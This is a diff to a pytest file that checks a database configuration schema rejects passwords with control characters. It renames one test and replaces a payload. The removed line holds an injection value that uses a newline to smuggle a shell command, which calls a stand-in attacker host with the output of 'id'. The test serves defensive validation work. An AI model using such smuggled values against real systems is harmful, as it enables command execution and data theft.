@@ -175,13 +175,13 @@ class TestControlCharRejection:
         with pytest.raises(ValidationError):
             DatabaseSensitive(password=f"a{char}b")
 
-    def test_sqlcl_injection_payload_is_rejected(self):
-        """The specific attack payload from the security review is rejected."""
+    def test_password_with_embedded_newline_is_rejected(self):
+        """A password containing an embedded newline must be rejected at the schema layer."""
         with pytest.raises(ValidationError) as excinfo:
             DatabaseConfig(
                 alias="TEST",
                 username="scott",
-                password='x"\nhost curl attacker.com/$(id)\n#',
+                password='x"\ny\n#',
                 dsn="db",
             )
         assert "password" in str(excinfo.value)
